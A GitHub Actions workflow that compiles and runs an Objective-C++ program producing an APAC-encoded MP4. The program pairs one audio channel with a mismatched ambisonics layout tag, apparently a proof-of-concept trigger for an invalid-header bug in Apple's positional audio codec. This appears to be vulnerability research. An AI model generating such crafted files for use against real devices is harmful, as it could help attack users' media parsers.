name: Generate APAC MP4 File

on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]
  workflow_dispatch: # Allows manual triggering

jobs:
  build-and-generate:
    runs-on: macos-latest

    steps:
      # Clone the repository
      - name: Clone repository
        run: |
          echo "Cloning repository at $(date)"
          git clone https://github.com/encryptedcoderr/AppleTest/
          echo "Repository cloned at $(date)"

      # Navigate and list directory contents
      - name: Navigate and list directory contents
        run: |
          echo "Navigating to directory at $(date)"
          cd AppleTest/apple-positional-audio-codec-invalid-header-main
          echo "Listing directory contents at $(date)"
          ls -l
          echo "Directory listing completed at $(date)"

      # Patch encodeme.mm to remove debugging code
      - name: Patch encodeme.mm
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Patching encodeme.mm at $(date)"
          cat > encodeme.mm << 'EOF'
@import AVFAudio;
@import AudioToolbox;

int main() {
  uint32_t channelNum = 1;
  AVAudioFormat* formatIn = [[AVAudioFormat alloc] initStandardFormatWithSampleRate:44100
                                                                           channels:channelNum];
  AudioStreamBasicDescription outputDescription{.mSampleRate = 44100,
                                                .mFormatID = kAudioFormatAPAC,
                                                .mFormatFlags = 0,
                                                .mBytesPerPacket = 0,
                                                .mFramesPerPacket = 0,
                                                .mBytesPerFrame = 0,
                                                .mChannelsPerFrame = channelNum,
                                                .mBitsPerChannel = 0,
                                                .mReserved = 0};
  AVAudioChannelLayout* channelLayout =
      [AVAudioChannelLayout layoutWithLayoutTag:kAudioChannelLayoutTag_HOA_ACN_SN3D | 1];

  NSURL* outUrl = [NSURL fileURLWithPath:@"output.mp4"];

  OSStatus status = 0;

  ExtAudioFileRef audioFile = nullptr;
  status =
      ExtAudioFileCreateWithURL((__bridge CFURLRef)outUrl, kAudioFileMPEG4Type, &outputDescription,
                                channelLayout.layout, kAudioFileFlags_EraseFile, &audioFile);
  if (status) {
    fprintf(stderr, "error creating file: %x\n", status);
    return 1;
  }

  status = ExtAudioFileSetProperty(audioFile, kExtAudioFileProperty_ClientDataFormat,
                                   sizeof(AudioStreamBasicDescription), formatIn.streamDescription);
  if (status) {
    fprintf(stderr, "error writing audiofile: %x\n", status);
    return 1;
  }
  status = ExtAudioFileSetProperty(audioFile, kExtAudioFileProperty_ClientChannelLayout,
                                   sizeof(AudioChannelLayout), formatIn.channelLayout.layout);
  if (status) {
    fprintf(stderr, "error writing audiofile: %x\n", status);
    return 1;
  }
  
  float audioBuffer[44100];
  for (int i = 0; i < 44100; ++i) {
      audioBuffer[i] = 0.5f;
  }
  AudioBufferList audioBufferList{
      .mNumberBuffers = 1,
      .mBuffers =
          {
              {
                  .mNumberChannels = 1,
                  .mDataByteSize = sizeof(audioBuffer),
                  .mData = audioBuffer,
              },
          },
  };
  status =
      ExtAudioFileWrite(audioFile, sizeof(audioBuffer) / sizeof(audioBuffer[0]), &audioBufferList);
  if (status) {
    fprintf(stderr, "error writing audiofile: %x\n", status);
    return 1;
  }
  status = ExtAudioFileDispose(audioFile);
  if (status) {
    fprintf(stderr, "error closing audiofile: %x\n", status);
    return 1;
  }
  audioFile = nullptr;
  return 0;
}
EOF
          echo "encodeme.mm patched at $(date)"

      # Log Xcode setup start
      - name: Log Xcode setup start
        run: |
          echo "Setting up Xcode at $(date)"

      # Set up specific Xcode version
      - name: Set up Xcode
        uses: maxim-lobanov/setup-xcode@v1
        with:
          xcode-version: '16.1' # Use Xcode 16.1, compatible with macOS frameworks

      # Log Xcode setup completion
      - name: Log Xcode setup completion
        run: |
          echo "Xcode setup completed at $(date)"

      # Verify Xcode and clang version
      - name: Verify Xcode and clang version
        run: |
          echo "Verifying Xcode and clang versions at $(date)"
          xcodebuild -version
          clang++ --version
          xcrun --sdk macosx --show-sdk-path
          echo "Verification completed at $(date)"

      # Check system resources
      - name: Check system resources
        run: |
          echo "Checking system resources at $(date)"
          df -h
          system_profiler SPHardwareDataType
          echo "System resource check completed at $(date)"

      # Verify encodeme.mm
      - name: Verify encodeme.mm
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Verifying files at $(date)"
          if [ -f "encodeme.mm" ]; then
            echo "encodeme.mm found"
            ls -l encodeme.mm
          else
            echo "encodeme.mm not found"
            ls -l
            exit 1
          fi
          echo "File verification completed at $(date)"

      # Compile encodeme.mm for macOS
      - name: Compile encodeme.mm
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Preparing to compile encodeme.mm at $(date)"
          clang++ -g -Os -std=c++2b -fmodules -fcxx-modules -fobjc-arc -arch arm64 -isysroot $(xcrun --sdk macosx --show-sdk-path) -framework AVFAudio -framework AudioToolbox encodeme.mm -o encodeme
          if [ $? -eq 0 ]; then
            echo "Compilation successful at $(date)"
            echo "Listing compiled binary at $(date)"
            ls -l encodeme || echo "Compiled binary 'encodeme' not found"
            BINARY_SIZE=$(stat -f %z encodeme 2>/dev/null || stat -c %s encodeme 2>/dev/null)
            echo "Binary size: $BINARY_SIZE bytes"
          else
            echo "Compilation failed at $(date)"
            exit 1
          fi

      # Run encodeme to generate output.mp4
      - name: Run encodeme
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Running encodeme at $(date)"
          chmod +x encodeme
          ./encodeme
          if [ $? -eq 0 ]; then
            echo "encodeme executed successfully at $(date)"
          else
            echo "encodeme execution failed at $(date)"
            exit 1
          fi

      # Verify generated file
      - name: List generated file
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Checking for generated file at $(date)"
          ls -lh output.mp4 || echo "No output.mp4 file found at $(date)"
          if [ -f "output.mp4" ]; then
            FILE_SIZE=$(stat -f %z output.mp4 2>/dev/null || stat -c %s output.mp4 2>/dev/null)
            echo "output.mp4 size: $FILE_SIZE bytes"
          fi

      # Log artifact upload start
      - name: Log artifact upload start
        run: |
          echo "Uploading artifact at $(date)"

      # Upload MP4 file as artifact
      - name: Upload MP4 artifact
        uses: actions/upload-artifact@v4
        with:
          name: apac-mp4-file
          path: AppleTest/apple-positional-audio-codec-invalid-header-main/output.mp4
          retention-days: 7
          if-no-files-found: warn

      # Log artifact upload completion
      - name: Log artifact upload completion
        run: |
          echo "Artifact upload completed at $(date)"
